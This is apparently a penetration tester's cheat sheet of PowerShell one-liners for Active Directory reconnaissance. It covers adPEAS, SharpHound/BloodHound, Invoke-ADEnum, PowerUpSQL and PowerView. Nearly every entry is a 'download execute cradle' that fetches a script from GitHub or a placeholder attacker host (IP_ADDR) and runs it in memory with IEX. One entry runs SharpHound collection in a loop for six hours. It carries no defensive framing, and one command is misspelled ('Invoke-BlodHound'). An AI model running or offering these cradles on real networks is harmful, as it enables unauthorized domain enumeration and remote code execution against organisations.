### adPEAS
Download Execute Cradle
```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
```
```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1);Invoke-adPEAS
```
import and run
```
. ./Invoke-adPEAS
```
```
Invoke-adPEAS
```
---
### BloodHound
Download Execute Cradle
```
IEX(IWR -usebasicparsing https://IP_ADDR/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup"
```
```
IEX(IWR -usebasicparsing https://IP_ADDR/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00
```
import and run
```
. ./sharphound.ps1
```
```
Invoke-BlodHound -CollectionMethod All
```
---
### Invoke-ADEnum
Download Execute Cradle
```
IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1);Invoke-ADEnum
```
import and run
```
Invoke-ADEnum
```
```
Invoke-ADEnum
```
---
### PowerUpSQL
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
```
### PowerView
Download Execute Cradle
```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
```